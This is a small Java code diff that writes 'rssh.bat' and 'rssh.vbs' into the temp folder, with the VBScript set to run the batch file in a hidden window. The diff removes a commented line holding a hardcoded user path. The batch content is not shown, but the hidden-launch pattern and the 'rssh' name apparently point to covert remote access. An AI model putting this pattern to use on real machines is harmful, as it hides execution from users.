@@ -15,7 +15,6 @@ public class CreateFilesInTempFolder {
         createFile(tempFolderPath, "rssh.bat", rsshBatContent);
 
         // File 2: rssh.vbs
-        //String vbsContent = "CreateObject(\"Wscript.Shell\").Run \"C:\\Users\\ultei\\AppData\\Local\\Temp\\rssh.bat\", 0, True";
         String vbsContent = "CreateObject(\"Wscript.Shell\").Run \"" + tempFolderPath + "\\rssh.bat\", 0, True";
         createFile(tempFolderPath, "rssh.vbs", vbsContent);
 
